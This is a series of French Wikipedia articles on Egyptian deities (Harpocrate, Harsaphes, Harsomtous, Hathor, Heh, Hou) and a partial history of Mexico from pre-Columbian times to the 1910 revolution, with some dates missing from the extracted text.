Avec l’avènement de l’empire romain et l'expansion de ses frontières, la figure d’Harpocrate a été diffusée jusque dans certaines provinces gauloises puisqu’une statuette de terre cuite représentant Harpocrate, aujourd’hui conservée au musée de Bretagne à Rennes, a été retrouvée dans une villa dépendant de l'aire d'influence de la cité antique de Condate. 
Représentations.
Harpocrate est représenté comme un enfant nu, un doigt devant la bouche, la mèche de l'enfance sur le côté. « On lui conserva le geste qui distinguait ses images dans l'art égyptien, mais on attacha à ce geste un sens tout nouveau ; l'idée se répandit qu'en portant un doigt à sa bouche le dieu commandait aux initiés de garder le silence sur les profonds mystères qu'on leur avait révélés. » Catulle emploie par plaisanterie le nom d'Harpocrate pour désigner un personnage discret. Cependant, ce geste, purement enfantin, est lié à la légende même d'Horus enfant, fils posthume d'Osiris. Élevé en secret dans les marais du delta du Nil, le dieu, par la couronne qu'il porte, se présente comme héritier de son père et assimile progressivement tous les dieux fils du panthéon égyptien.
Parmi les figures d'Harpocrate, il faut distinguer d'abord celles où l'on a visiblement imité l'art égyptien, soit qu'elles aient été exportées d'Égypte dans l'Antiquité, soit qu'on les ait fabriquées hors de ce pays. Elles sont exécutées avec une raideur et une sécheresse voulues et elles portent des attributs copiés sur les monuments de l'Égypte, tels que le pschent et le fouet. À Myrina (Asie Mineure) on en a trouvé une en terre émaillée, chargée d'hiéroglyphes faux. En second lieu viennent les figures dont le style est conforme aux traditions de l'art grec ; quelques exemplaires, d'une facture hybride, pourraient servir de transition entre cette catégorie et la précédente.
Dans les images proprement gréco-romaines le dieu porte sur le front, comme ses parèdres Isis et Sarapis, une fleur de lotus ou un croissant. Il est généralement nu comme Éros, ou légèrement vêtu ; parfois aussi il a des ailes derrière le dos. Un carquois rappelle ses attributions de divinité solaire identifiée avec Apollon. Par suite du rapport que sa destinée présente avec celle du Dionysos des Mystères, il a le front ceint d'une couronne de lierre ; une nébride est jetée sur ses épaules ; sa main gauche tient une corne d'abondance, symbole de la fécondité de la nature, dont il personnifie les forces inépuisables. Parfois, il tient un vase sous un bras, contenant une bouillie dont il se nourrit avec l'index. Identifié avec Héraclès, vainqueur des monstres, il est parfois armé d'une massue. Il est probable qu'à l'origine les artistes ne donnèrent au jeune dieu alexandrin qu'un petit nombre d'attributs ; mais la plupart des images que nous possédons datent de l'époque où le syncrétisme accumulait sur une même divinité les symboles les plus divers. On confondit alors dans la personne d'Harpocrate tous les types de dieux enfants, créés par les artistes antérieurs. Les Romains ajoutèrent à ses attributs la bulla, qui chez eux ornait le cou des enfants ; on emprunta enfin à l'iconographie égyptienne l'épervier, qu'on plaça à ses côtés.

</doc>
<doc id="1411" url="https://fr.wikipedia.org/wiki?curid=1411" title="Harsaphes">
Harsaphes

Harsaphes ("Celui qui est sur son lac") est une divinité égyptienne à tête de bélier assimilée par les Grecs à Héraclès, originaire d'Héracléopolis, étroitement liée à Rê et à Osiris. Il est une divinité solaire liée à la justice.
Son iconographie le représente en général en dieu anthropomorphe criocéphale coiffé de la couronne solaire, composée de la couronne "Atef," portée par Osiris, ornée de symboles solaires tels que les uræi et disques solaires.
Il est qualifié de "Roi de Haute et Basse-Égypte" et de "souverain des deux rives" à Héracléopolis Magna, affirmant ainsi sa puissance sur les quatre points cardinaux de l'Égypte.
Ce dieu aux origines ancestrales deviendra à la Troisième Période intermédiaire l'une des divinités majeures du pays, accordant la souveraineté au roi et protégeant le pays contre le chaos.

</doc>
<doc id="1412" url="https://fr.wikipedia.org/wiki?curid=1412" title="Harsomtous">
Harsomtous

Harsomtous ("Horus qui unit les deux terres") est un dieu de la mythologie égyptienne.
Fils d'Hathor et d'Horus d'Edfou, il est célébré lors des rites agraires et des fêtes lunaires. Il est également assimilé à Shed car il protège des animaux dangereux.
On trouve sur les textes et bas-reliefs des temples d'Edfou et de Dendérah l'histoire de ce dieu.
Dès sa naissance, il est allaité ce qui lui permet d'hériter de son père. C’est aussi une divinité nourricière car c’est un enfant élevé au lait maternel. Il y a des scènes dans le mammisi d’Edfou, le temple de la naissance, qui ponctuent le parcours des offrandes où il apparaît comme le nourricier de la triade Horus, Hathor et Harsomtous. De même dans la cour de ce temple, il y a des scènes du portique sud, où sont mis en vis-à-vis Horus enfant et Harsomtous, qui marquent également cet aspect ainsi que la fonction d’héritier d’Horus.
Dans les chapelles aussi, on peut voir Harsomtous faire le lien entre les deux Horus, le solaire et le terrestre, réactualisant la transmission du pouvoir lors des fêtes du Nouvel An qui célèbrent le renouvellement de l’année, du pouvoir et de la fécondité.
Dans le temple de Dendérah, des hiéroglyphes ressemblant à des ampoules électriques symbolisent la création du monde. Une des cryptes est dédiée au dieu Harsomtous. Il est le serpent dans une sorte d’enveloppe amniotique sortant d'une fleur de lotus. Cette enveloppe est soutenue par le dieu Heh et par un pilier Djed, qui participe à la création du monde.

</doc>
<doc id="1413" url="https://fr.wikipedia.org/wiki?curid=1413" title="Hathor">
Hathor

Dans la mythologie égyptienne, Hathor (du grec ancien signifiant « Maison d'Horus ».) est la déesse de l'Amour, de la Beauté, de la Musique, de la Maternité et de la Joie.
C'est à l'origine une déesse céleste confondue avec Nout. Rê remplace Shou en tant que père de Geb et Nout. Ainsi, Nout assume en partie la fonction de Hathor comme maîtresse du sycomore, l'arbre qui assure aux défunts boisson et nourriture, et Hathor est représentée partiellement comme une déesse céleste. Son attribut est le ménat (collier à contrepoids). Considérée comme l'œil de Rê, c'est elle qui, dans la version de l'Ogdoade d'Hermopolis, châtie les humains.
Mais elle est plus connue en tant que déesse des Festivités et de l'Amour. Dans ce rôle, elle est vénérée à Dendérah et associée au dieu Horus, dans la ville d'Edfou. Elle est représentée sous les traits d'une vache, ou d'une femme portant le disque solaire entre ses cornes.
Hathor a pour parèdre Horus (son nom signifie « Demeure du dieu Horus », ce qui fait d'elle l'épouse du dieu-faucon), et pour fils Harsomtous (surnommé Horus le jeune) et Ihi.
Elle est une des déesses les plus populaires et importantes durant tout le long de l'histoire de l'Égypte antique, et est vénérée aussi bien par la famille royale (elle est la nourrice du pharaon) que par les gens du commun, dans les tombes desquels elle est décrite comme « maîtresse de l'Ouest », accueillant le mort dans sa nouvelle vie. Elle aide aussi les femmes à donner naissance, et est la déesse patronne des mineurs.
. Elle est intégrée très tôt au panthéon phénicien en grande « dame de Byblos », mais aussi reine du pays de Pount.
Présentation.
Premières apparitions.
Les premières représentations explicites d'Hathor datent de la ; elle y est représentée sous la forme d'une vache ou sous forme d'une femme à cornes.
Une divinité vache apparait auparavant sur la ceinture du roi de la palette de Narmer, qui date de l'ère pré-dynastique. Ce pourrait être Hathor ou la déesse Bat à laquelle elle est parfois identifiée. Certains éléments, en particulier un passage des Textes des pyramides font toutefois pencher pour Hathor.
Par ailleurs, une urne de pierre trouvée à Hiérakonpolis et datant de la a sur le rebord une représentation du visage d'une divinité à tête de vache, avec des étoiles sur ses oreilles et des cornes. Cette description peut faire penser à Hathor, ou à Bat, en tant que déesse du ciel. Un autre artefact de la montre une vache couchée sur un ivoire gravé avec l'inscription « Hathor dans les marais » indiquant son association avec la végétation, et les marais de papyrus en particulier.
Généalogie et famille.
La relation entre Hathor et Rê est complexe. Hathor, œil de Rê, est considérée comme sa fille, mais elle devient aussi parfois sa femme ou sa mère. Elle a hérité ce rôle maternel d'une autre déesse vache "Mht wrt" (« Grande crue ») qui portait Rê entre ses cornes dans un mythe de la création. En tant que mère, elle donne naissance à Rê tous les matins sur la rive orientale et en tant que femme elle conçoit d'une union avec lui chaque jour.
Hathor est également épouse d'Horus, avec lequel elle a un fils Ihi.
Comme Isis, Hathor est parfois décrite comme la mère d'Horus, c'est pourquoi les pharaons sont parfois décrits comme « Fils d'Hathor ». Les deux déesses, initialement en concurrence, sont confondues dans des périodes plus tardives, et on voit apparaître des représentations d'Isis avec la coiffe d'Hathor.
Elle est aussi associée à Bastet, Sekhmet et Tefnout.
Représentations et associations.
Durant le troisième millénaire avant notre ère, Hathor, tout comme la déesse Nout, est associée à la Voie lactée.
Les quatre pattes de la vache céleste représentant Nout ou Hathor peuvent être vues comme les piliers sur lesquels le ciel est porté, les étoiles sur son ventre représentant la Voie lactée sur laquelle vogue la barque solaire de Rê, représentant le soleil. En Égypte antique, la Voie lactée est vue comme une chute d'eau dans les cieux, comme "Le Nil dans le ciel". À cause de cela, Hathor est considérée comme étant à l'origine de la crue annuelle du Nil. Cela explique aussi pourquoi elle est vue comme un annonciatrice d'une naissance imminente, en analogie avec la membrane amniotique qui se fend et libère ses eaux.
Hathor est aussi associée au royaume des morts. Le culte d'Osiris promet la vie éternelle aux justes. Aux origines du culte, tout mort digne de cette vie éternelle, homme ou femme, devient un Osiris. Mais au début des temps romains, les femmes s'identifient à Hathor, les hommes restant identifiés à Osiris. Hathor est alors appelée « Déesse de la nécropole thébaine », ou « Déesse du sycomore » (arbre représentant le monde des défunts).
Hathor reste essentiellement une déesse de la joie, et en tant que telle elle est très aimée par la population en général. Elle est vénérée par les femmes, qui aspirent à incarner son rôle multiple d'épouse, mère et amante. En tant que telle, elle a gagné le titre de « dame de la maison de Jubilation », et « celle qui emplit le sanctuaire de Joie ». Le culte d'Hathor est si populaire qu'un grand nombre de fêtes lui sont dédiées, et que de nombreux enfants portent son nom (plus que pour n'importe quel autre dieu). Même la prêtrise d'Hathor est inhabituelle, car hommes et femmes peuvent tous y accéder.
Hathor est généralement représentée comme une déesse vache, avec des cornes entre lesquelles apparaissent le disque solaire et l'uræus. Parfois, des plumes doubles apparaissent aussi pour les périodes tardives, ainsi qu'un collier ménat, "collier musical" turquoise souvent porté par les femmes.
Les Grecs anciens identifient Hathor à la déesse Aphrodite, et les Romains à Vénus.
Guerrière sanguinaire.
Le Moyen Empire commence quand le pharaon de Haute-Égypte prend par la force le contrôle de la Basse-Égypte, qui était devenue indépendante pendant la Première Période intermédiaire. Cette unification entraîne une guerre brutale d'au moins vingt-huit ans qui fait beaucoup de victimes. À la fin de la guerre, le calme revient, et le règne du pharaon suivant, , est pacifique ; l'Égypte redevient prospère.
Un conte de Basse-Égypte "(Livre de la vache céleste)" raconte cette expérience guerrière. Dans le conte, après la guerre, Rê (représentant le pharaon de Haute-Égypte) n'est plus respecté par le peuple (de Basse-Égypte), et les Égyptiens arrêtent de lui obéir. Rê annonce alors à Hathor que certaines personnes sur terre projettent de l'assassiner. Celle-ci est tellement furieuse que les hommes qu'elle a créés aient assez d'audace pour menacer Rê, qu'elle devient Sekhmet (déesse guerrière de Haute-Égypte) pour les détruire. Elle est alors assoiffée de sang, et commence à tuer les humains. Comme le massacre continue, Rê, voyant le chaos sur terre, décide d'arrêter la lionne sanguinaire. Il verse alors de grandes quantités de bière couleur sang sur le sol pour la piéger. Elle en boit tant — pensant que c'est du sang — qu'elle est prise d'ivresse, puis elle revient à son identité d'Hathor pacifique.
Culte d'Hathor.
Fêtes en l'honneur d'Hathor.
De nombreuses fêtes sont données en l'honneur de Hathor tout au long de l'année. Un mois (Athyr, en septembre-octobre) est même à son nom, de nombreuses fêtes de la fécondité y ont lieu. Elle est notamment aussi célébrée à Dendérah au nouvel an. Entre novembre et janvier, au moment des inondations, une fête célèbre le retour de Nubie de la déesse, avec qui revient la crue.
Sa fête la plus importante se déroule au mois de mai-juin, à la fin de l'année égyptienne. Elle fête la réunion d'Hathor et de son époux Horus (Horbehedety). La statue de Hathor est à cette occasion sortie du temple de Dendérah et emmenée à Edfou par bateau. Elle y retrouve son époux à la huitième heure de la nouvelle lune du onzième mois de l'année, et leur "mariage mystique" est de nouveau célébré. La fête dure alors quatorze jours.
Lieux de culte.
Comme le culte d'Hathor remonte aux temps préhistoriques et est mêlé à celui d'autres dieux-vaches, il n'est pas possible de déterminer l'origine géographique de son culte.
Le temple de Dendérah, dont la construction s'étale entre et les Ptolémées, est remarquable car il lui est entièrement consacré. Le culte y était célébré par des prêtresses et prêtres, qui aussi dansaient et chantaient, accompagnés par d'autres artistes. 
! width="50%" |Temple ou sanctuaire dédié à
! width="50%" | Lieu
Hathor hors de la vallée du Nil.
Hathor est révérée à Canaan au avant notre ère. À cette époque, la province est gérée par l’Égypte. Hathor est particulièrement révérée dans la ville sainte de Hazor, que l'Ancien Testament dit avoir été détruite par Josué ().
Un des principaux temples à Hathor a été construit par dans les mines de cuivre de Timna, dans la région d'Édom. L'ancienne localité de Sarabit al-Khadim (Arabe : سرابت الخادم) est située dans le sud-est de la péninsule du Sinaï, où l'on extrayait de la turquoise en grande quantité dans l'Antiquité. Les fouilles archéologiques, initialement menées par Sir Flinders Petrie, révèlent les anciens camps de mineurs, et un temple à Hathor.
Les Grecs, maîtres de l’Égypte pendant avant la domination romaine de -31, vénérèrent aussi Hathor, qu'ils identifièrent à Aphrodite.
Hommage.
Hathor est l'une des 1 038 femmes dont le nom figure sur le socle de l'œuvre contemporaine "The Dinner Party" de Judy Chicago. Elle y est associée à la "déesse Ishtar", troisième convive de l' de la table.
L'astéroïde (2340) Hathor a été ainsi nommé en son honneur.

</doc>
<doc id="1414" url="https://fr.wikipedia.org/wiki?curid=1414" title="Heh">
Heh

Le dieu Heh est, à partir du Nouvel Empire, issu de la fusion de deux divinités, l'une membre de l'Ogdoade d'Hermopolis (association de huit entités divines), qui joue un rôle essentiel dans la cosmologie d'Hermopolis, l'autre, le dieu du temps infini, le génie de l'éternité.
 est utilisée pour représenter le million, lequel est considéré comme l'infini dans les mathématiques égyptiennes.
Heh primordial.
À Hermopolis, cité du dieu Khnoum qui y était perçu comme le potier créateur du monde, chaque couple correspond à un principe fondateur du monde ; avec Hehet, sa parèdre, il y représente l'espace infini.
Heh de l'éternité.
« Heh de l'éternité » ne fut jamais qualifié de démiurge. Tout ce qu'on sait de ses origines a semble-t-il disparu ; par contre, nous savons que le génie de l'éternité fut plusieurs fois dédoublé au point d'atteindre le nombre de huit, l'assimilant de ce fait au Heh « primordial ».
Les huit « Heh de l'éternité », regroupés par paire, soutenaient la voûte céleste. Chacun de ces quatre « piliers du ciel » était protecteur d'une région de cette voûte céleste. Dans ce rôle de soutien du ciel, Heh est devenu une hypostase de Shou, le dieu de l'air, qui de ses deux bras soulève le ciel (représenté par Nout) et le dissocie de la terre (représentée par Geb). Les quatre couples Heh furent alors perçus comme quatre vents ; mais pour une raison qui nous échappe, ces vents furent considérés de façon négative, comme sortis de la bouche de Seth.
Ville de « Heh ».
Le pharaon , après une campagne militaire vers le sud, construisit au niveau de la troisième cataracte du Nil, une cité qu'il baptisa « Heh », du nom du dieu. Un siècle plus tard, elle fut fortifiée par .
Heh et Toutânkhamon.
Heh est représenté sur quelques-uns des objets découverts en 1922 par Howard Carter dans le tombeau de Toutânkhamon. L'une des plus parfaites représentations du dieu figure sur le fauteuil cérémoniel du jeune pharaon. Heh, conformément à l'usage, est représenté agenouillé sur le signe de l'or "nebou", une croix "ânkh" pendant à son bras, tenant une palme dans chaque main ; ces palmes se terminent par un disque solaire que protège un "uræus" au cou duquel pend également une croix ânkh ; sur la tête du dieu, le disque solaire est protégé par un double uræus.
Cette représentation garantit à Toutânkhamon l'espoir d'une longue vie prospère.

</doc>
<doc id="1415" url="https://fr.wikipedia.org/wiki?curid=1415" title="Heqet">
Heqet



</doc>
<doc id="1416" url="https://fr.wikipedia.org/wiki?curid=1416" title="Hou">
Hou

Dans la mythologie égyptienne, Hou est le verbe créateur. Dans cette cosmogonie memphite, il est associé au démiurge Ptah.
Il représente le processus de concrétisation. Dans le "livre de l'Amdouat", il se trouve à l'avant dans la barque solaire à côté de Sia qui lui, est à l'arrière. Il dirige la barque solaire de Ré dans son parcours nocturne.
Hou et Sia sont les dieux qui guident le soleil dans ses transformations nocturnes jusqu'à ce qu'il sorte régénéré et victorieux à l'aube.
Les textes des sarcophages, alors qu'ils assimilent le mort à Rê, dévoilent une partie de la cosmologie memphite ; Rê est celui qui a créé Hou et qui est Hou lui-même : .

</doc>
<doc id="1417" url="https://fr.wikipedia.org/wiki?curid=1417" title="Histoire de la Réforme">
Histoire de la Réforme



</doc>
<doc id="1418" url="https://fr.wikipedia.org/wiki?curid=1418" title="Histoire du Mexique">
Histoire du Mexique

L'histoire du Mexique, qui a commencé à l'époque mésoaméricaine, s'étend sur plus de deux millénaires, depuis les plus anciens vestiges d'écriture olmèque. L'histoire du Mexique est traditionnellement divisée en trois grandes périodes : préhispanique, coloniale et indépendante.
Dans les années 2020, le Mexique est habité par Mexicains, hors diasporas et migrations, en croissance assez régulière (20 en 1940, 15 en 1910, 7,5 en 1846, 4,6 en 1790, et seulement un million vers 1600), malgré guerres et évolution territoriale. La population des Amérindiens, vers 1500, est estimée à environ 18 à 25 millions d'individus.
Époque préhispanique.
Préhistoire.
Les premiers groupes humains arrivés en Amérique sont venus d'Asie du Nord-Est, en traversant la Béringie, à l'époque exondée, pour s'établir en Alaska. La présence humaine au sud de l'inlandsis laurentidien daterait d'environ , selon les analyses paléogénétiques des fossiles humains les plus anciens connus à ce jour sur le continent américain, et d'au moins selon la datation des sites archéologiques les plus anciens du continent.
Vers le milieu du , la plus grande partie du Mexique actuel correspond à une aire culturelle appelée Mésoamérique, qui se prolonge vers le sud. Au nord du Mexique, d'autres aires culturelles s'étendent vers le nord : l'Oasisamérique et l'Aridamérique.
Mexique précolombien.
À partir de notre ère, plusieurs cultures et civilisations se sont succédé ou côtoyées en Mésoamérique : Olmèques, Mayas, Zapotèques, Mixtèques, Toltèques, Tarasques et Aztèques, entre autres. Lors du siècle précédant l'arrivée des Espagnols, l'Empire aztèque était en pleine expansion dans le centre du Mexique. Son unique concurrent important était le royaume tarasque.
Le nom actuel du Mexique, en espagnol, vient du nom de sa capitale, Mexico, alors capitale de l'Empire aztèque à l'époque postclassique, et dont le nom remonte lui-même au moins à la fondation de la ville vers le début du ou la fin du .
À l'origine, il signifie probablement « (la ville qui est) au milieu (du lac) de la lune ».
Conquête espagnole (1519-1590 c).
Francisco Hernández de Córdoba et Juan de Grijalva explorent les côtes méridionales du Mexique, respectivement en 1517 et 1518.
Le conquistador Hernán Cortés (1485-1547)envahit le pays sous bannière espagnole en 1519, après avoir débarqué à proximité de l'actuelle Veracruz.
Il baptise l'emplacement de cette ville le long de la côte "Villa Rica de la Vera Cruz".
À cette époque, les Aztèques sont le groupe dominant dans la région.
Ils prennent d'abord les conquistadors espagnols, conformément aux anciennes légendes toltèques, pour des envoyés des dieux.
Pour cette raison, les Aztèques n'opposent initialement que peu de résistance à l'avancée des conquistadors, mais plus tard, ils entrent en opposition lorsqu'ils se rendent compte que ce ne sont pas les messagers divins d'abord admirés.
Après plusieurs batailles, au cours desquelles les armées espagnoles furent plusieurs fois proches de la défaite (notamment lors de la "Noche Triste" du ), la capitale aztèque de Tenochtitlan fut attaquée par une alliance entre les Espagnols et les Tlaxcaltèques (les principaux ennemis des Aztèques), qui entamèrent le siège. Les Aztèques furent défaits en 1521 et leur capitale rasée.
Il a été démontré qu'au cours du XVIe siècle, que les guerres, les famines et les épidémies ont entraîné un déclin démographique, potentiellement aussi élevé que 90 % de la population. Des 10 à 20 millions d'autochtones vivant au Mexique à l'époque du contact avec les Européens, seulement 2 millions de personnes survivent à la fin du . Les maladies infectieuses, telles que la variole, la rougeole, les oreillons, la grippe, le typhus, la fièvre typhoïde et la fièvre entérique, la rubéole, la coqueluche, la diphtérie grave, la dysenterie endémique, les fièvres tertiaires (paludisme) et la syphilis sont considérées comme ayant provoqué des épidémies à grande échelle en Méso-Amérique coloniale, contribuant de manière significative au déclin de la population.
Les Espagnols étendent rapidement leur domination au-delà des frontières de l'empire aztèque.
Les Tarasques, effrayés par le sort des Aztèques, se soumettent sans combattre.
En 1530, les Espagnols exécutent leur dernier souverain.
Dans certaines régions, la conquête est fragile.
Les habitants du Jalisco se révoltent en 1541, mettant les Espagnols en difficulté.
Le conquistador Pedro de Alvarado perd la vie au cours de ce soulèvement généralement connu sous le nom .
Il faut l'intervention du vice-roi de Nouvelle-Espagne, Antonio de Mendoza, pour venir à bout de la révolte.
Plus au nord s'étend le territoire de populations nomades, connues des habitants de la Mésoamérique sous le nom de Chichimèques. Cette appellation recouvre plusieurs groupes : , , ou Pames.
De tout temps, ils représentent une menace pour les sédentaires du sud et se révèlent beaucoup plus coriaces pour les Espagnols que les Aztèques.
En 1546, la découverte de mines d'argent à l'emplacement de la future ville de Zacatecas ravive l'intérêt des Espagnols pour les régions du nord.
En 1561, les Chichimèques s'unissent contre eux.
Leurs raids contre les établissements miniers espagnols entretiennent alors l'insécurité dans les vastes étendues du nord.
Les Espagnols s'efforcent de les sédentariser en leur envoyant des missionnaires, mais aussi en fixant parmi eux des colonies de Tlaxcaltèques, venus du centre du Mexique (1590).
C'est la (1550-1590).
Époque coloniale espagnole (1521c-1821).
Pour toute la période qui s'étend entre la défaite de l'Empire aztèque et l'indépendance du Mexique, la colonie se nomme Nouvelle-Espagne (1521-1821).
La conquête et l'époque coloniale font émerger de nouveaux groupes ethniques : 64 d'entre eux sont ainsi clairement définis par le gouvernement colonial, dont
L'actuel Mexique fait alors partie de la vice-royauté de la Nouvelle-Espagne ("Nueva España" en espagnol), ce qui recouvre le territoire de l'actuel Mexique, mais aussi progressivement environ deux autres millions de kilomètres carrés dans le sud-ouest des États-Unis (ainsi que les Philippines).
La frontière Nord de la Nouvelle-Espagne n'est pas définie avec précision mais peut se lire d'après le caractère hispanique des noms géographiques conservés de nos jours. La frontière Sud est également variable.
De l'indépendance aux années 2000.
L'évolution territoriale du Mexique de manière formelle s'effectue principalement dans les années 1820-1860.
La guerre d'indépendance (1810-1821).
Miguel Hidalgo, un "criollo" c'est-à-dire un espagnol né au Mexique (à ne pas confondre avec le terme français créole), curé du village de Dolores, partisan de Ferdinand VII détrôné par les Français et exilé à Valençay, lance un appel durant la nuit du au (que l'on nomme plus tard le Grito de Dolores) aux habitants de son village dont le but est de se libérer des Espagnols favorables à Joseph Bonaparte.
On peut citer José María Morelos, Vicente Guerrero, Agustín de Iturbide parmi les personnages clés de la guerre d'indépendance.
L'arrivée d'un gouvernement libéral en Espagne convainc les "criollos" (espagnols nés au Mexique), cherchant à s'approprier les privilèges des espagnols dits peninsulares (vivant au Mexique mais nés en Espagne), de proclamer l'indépendance.
La déclaration d'indépendance est approuvée et une première Constitution rédigée le par le Congrès de Chilpancingo, le « Décret Constitutionnel pour la Liberté de l'Amérique Mexicaine » ("Decreto Constitucional para la Libertad de la América Mexicana") qui définit un pouvoir exécutif mexicain faible et un pouvoir législatif mexicain fort est promulgué par le même congrès le 22 octobre, et l'Acte solennel de la Déclaration d'indépendance de l'Amérique septentrionale ("Acta Solemne de la Declaración de Independencia de la América Septentrional") est officiellement signée par le congrès le .
En 1821, l'armée dite des « trois garanties » entre dans la capitale.
Le , le traité de Córdoba confirme l'indépendance au Mexique.
De l'indépendance à l'intervention française (1822-1848).
Le , Agustín de Iturbide est couronné sous le nom d'Augustin , pour un règne (Premier Empire mexicain (1822-1823)), qui dure quelques mois, suivi de troubles et de guerres civiles, mais sans remettre en cause l'indépendance de l'État.
Le Mexique dispose de belles villes, d'une haute société évoluée.
Le patriotisme est vigoureux dans les élites créoles, mais pas dans la masse indigène qui ignore l'existence d'une Nation mexicaine. 
Ce sentiment n'est cependant pas suffisamment développé pour conduire les esprits à une politique commune.
L'histoire du Mexique entre 1820 et 1848 pourrait presque se résumer à une succession de troubles qui suscitèrent les réactions des puissances européennes, inquiètes des dettes non remboursées.
En 1838, le gouvernement de Louis-Philippe, qui ne peut obtenir les réparations qu'il demande, envoie une flotte bombarder Saint-Jean d'Ulua et s'emparer de Veracruz, dans un épisode surnommé guerre des Pâtisseries (1838-1839).
À la suite de la guerre contre les États-Unis (lire ci-dessous) entre 1846 et 1848, un apaisement se fait sentir.
En 1853, les troubles reprennent, vers une nouvelle guerre civile.
En 1855, le Mexique s'engage dans la "Réforme", violemment anticléricale.
En 1835, les "Siete Leyes" ("Sept lois") voient le jour.
En 1857, une nouvelle constitution est promulguée.
Guerres contre les États-Unis (1835-1848).
Le Texas, peuplé de 85 % d'immigrés américains, proclame son indépendance (avec l'aide en hommes, argent, et armes de Washington) le , après la victoire de San Jacinto, acquise sous la conduite de Samuel Houston qui profite de la faiblesse des gouvernements de Miguel Barragán (1835-36) et de José Justo Corro (1836-37) et de la vétusté des troupes envoyées sous les ordres du général Antonio López de Santa Anna.
S'engage alors un conflit avec les États-Unis, dont le Mexique, toujours aussi faible malgré les efforts du général Santa-Anna, sort vaincu (1846-1848).
Le traité de Guadalupe Hidalgo du entraîne la perte de très grands territoires alors désertiques ou peu peuplés, « vendus » ensuite sous la présidence de Manuel de la Peña y Peña aux États-Unis pour de dollars.
De ce fait, une grande partie de la moitié nord du pays est ainsi perdue au profit des États-Unis : l'Arizona, la Californie, le Nevada, le Nouveau-Mexique, le Texas et l'Utah.
Intervention française (1861-1867).
Face à l'incapacité du gouvernement de Benito Juárez de payer les dettes mexicaines, les gouvernements français, espagnol et britannique envoient une force expéditionnaire occuper le port de Veracruz.
Mais il s'agit d'un prétexte, car les Européens (surtout Napoléon III) souhaitent profiter de la guerre de Sécession américaine pour se réimplanter sur le continent américain.
Les Anglais et les Espagnols traitent rapidement par la Convention de Soledad (février 1862), mais les Français décident de se maintenir.
En 1862-1867, le Mexique est occupé par les forces françaises lors de l'expédition du Mexique, qui amène la création de l'empire éphémère de Maximilien de Habsbourg, qui prend fin en 1867, avec le départ du territoire mexicain des militaires français.
Le Porfiriat (1876-1910).
La présidence de Porfirio Díaz est également connue sous le nom de "Porfiriato".
Ce régime, héritier d'une période de de troubles, de guerres et d'anarchie dure environ trente ans, de 1876 à 1910. En l'absence de capitaux mexicains suffisants, Díaz encourage les investissements étrangers.
Il s'appuie aussi sur les conseils de positivistes disciples d'Auguste Comte connus sous le nom de "cientificos".
Le pays fait durant cette période de grands progrès et se modernise rapidement.
Porfirio Diaz inaugure le monument de l'indépendance et l'hémicycle à Benito Juárez et le (centenaire du début de la guerre d'indépendance du Mexique) tout le centre de Mexico est illuminé électriquement ainsi que la cathédrale.
Le gouvernement du Mexique invite aux festivités les représentants des gouvernements avec lesquels il entretient des relations diplomatiques.
L'application des Lois de Réforme, et, en particulier celle de la publiée en 1856, qui nationalise les biens de l'Église (et que l'État mexicain revend aux investisseurs), et de la grande propriété, est une avancée et un progrès considérables.
À la fin du régime, 95 % des habitants des campagnes ne sont pas propriétaires de terres.
Ils sont ouvriers agricoles dans d’immenses haciendas, vivent de l'agriculture de subsistance ou forment un prolétariat urbain.
Les grèves ouvrières se font plus fréquentes à partir de 1906, mais sont réprimées avec violence.
En outre, le régime use de la Loi publiée le pour le gouvernement de Benito Juárez et cosignée par qui permet d'abattre un prisonnier qui s'enfuit.
Cette loi reste appliquée jusqu'à la Révolution de 1910, et va être remise en vigueur par le gouvernement constitutionnaliste de Venustiano Carranza en 1915.
Le syndicalisme mexicain apparait dans les années 1870.
Le se constitue le "Gran Circulo de Obreros de Mexico", d'inspiration anarchiste.
En 1876, au premier congrès des sociétés ouvrières du Mexique, c'est le mutualisme qui prédomine. En 1890, est fondée la "Gran Confederacion de los Trabajadores Mexicanos", et en 1905 le "Gran Circulo de Obreros Libres" (dans les usines textiles de Puebla et de Veracruz.
En 1907, se forme le syndicat des employés des chemins de fer, qui est interdit par le gouvernement l'année suivante.
Les grèves se font plus nombreuses à partir de 1906.
Cette année là, pour réclamer la journée de huit heures et l'obtention d'un salaire égal à celui des employés américains ( par jour) est réprimée avec l'aide de rangers américains qui ont franchi la frontière mexicaine illégalement en combattant les douaniers mexicains qui tentaient de les en empêcher.
Lors des grèves, le gouvernement se place aux côtés des propriétaires d'usines et le revendique, espérant favoriser les investissements.
La Révolution mexicaine (1910-1920).
Porfirio Díaz, au pouvoir depuis une trentaine d'années, souhaite à nouveau se présenter à ).
Plusieurs candidats se présentent, dont les plus connus sont José Yves Limantour et Francisco Madero qui annonce aussi sa candidature.
Díaz le fait emprisonner, puis le relâche.
Le vieux président remporte ensuite des élections truquées.
Exilé aux États-Unis, Madero ne s'avoue pas vaincu, lance le Plan de San Luis, daté du , dans lequel il déclare nulles les élections et exhorte les Mexicains à prendre les armes le contre le gouvernement.
Après des débuts difficiles, le soulèvement connaît ses premiers succès au Chihuahua, dans le nord du pays, Madero et Abraham González Casavantes parviennent à recruter des chefs militaires improvisés mais très capables tels que Pascual Orozco et Francisco Villa 
Le mouvement s'étend à d'autres régions, notamment au Morelos où dès le 11 mars 1911, Emiliano Zapata et les villageois luttent pour récupérer les terres collectives dont ils ont été spoliés à la suite de la promulgation de la constitution de 1857 par le gouvernement de Benito Juárez, ces terres ayant été revendues par le gouvernement aux grands propriétaires de plantations de canne à sucre.
L'armée fédérale, incapable de faire face sur plusieurs fronts, subit de lourdes défaites dans le nord du pays et le président Díaz se résigne à démissionner en mai 1911, puis à quitter le pays.
L'élection de Madero en novembre 1911 (qui n'obtient qu'un peu moins de soit 0,1 % de la population.) n'améliore guère la situation sociale et politique.
Il doit faire face à la désillusion de certains de ses propres partisans mais aussi à l'opposition de ceux de l'ancien régime, qui occupaient encore de nombreux postes.
Issu de la bourgeoisie, il connaît peu les conditions de vie et les réalités sociales du pays et se préoccupe avant tout de rétablir la légalité constitutionnelle.
Il affronte cinq révoltes importantes dont celle d'Emiliano Zapata qui réclame l'application du , unique but de sa révolte et qui consiste principalement en la restitution des terres collectives prises aux villages, mais aussi en la destitution de Madero.
Il opère une réforme administrative, mais partielle.
Il annonce également une réforme de l'armée qui ne touchera cependant pas à la puissance et à l'influence des généraux porfiristes, tels que Bernardo Reyes et Felix Diaz (le neveu de Diaz), qui lui sont pourtant violemment hostiles.
Il veut restaurer la stabilité du pays et tente de rassurer les investisseurs étrangers et leurs gouvernements.
Il est pourtant considéré comme un radical par les intérêts économiques américains et par l'ambassadeur Henry Lane Wilson.
Il doit faire front partout.
